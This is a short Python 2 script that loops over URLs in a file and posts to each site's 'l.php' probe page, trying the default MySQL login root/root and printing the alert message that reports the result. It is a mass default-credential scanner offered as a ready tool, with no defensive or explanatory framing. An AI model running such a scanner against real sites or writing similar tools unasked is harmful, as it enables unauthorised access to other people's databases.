import sys, urllib2,gzip,StringIO,re,sys,os,time
os_char='gb18030'
def Login(url):
    try:
        url = url + 'l.php'
        params = "host=localhost&port=3306&login=root&password=root&act=MySQL%E6%A3%80%E6%B5%8B&funName="
        headers = {
            "Accept": "image/gif, */*",
            "Accept-Language": "zh-cn",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
            "Connection": "Keep-Alive",
            "Cache-Control": "no-cache"
            }
        request = urllib2.Request(
        url,
        data = params,
        headers=headers
        )
        response = urllib2.urlopen(request)
        data = response.read()
        reli = re.findall(u'<script>alert(.*?)</script>',data)
        print reli[0].decode("utf-8").encode(os_char),url
    except:
        pass
if __name__ == '__main__':


    fp=open("url.txt", "r")
    alllines=fp.readlines()
    fp.close()
    for eachline in alllines:
            eachline=eachline.strip('\n')
            Login(eachline)
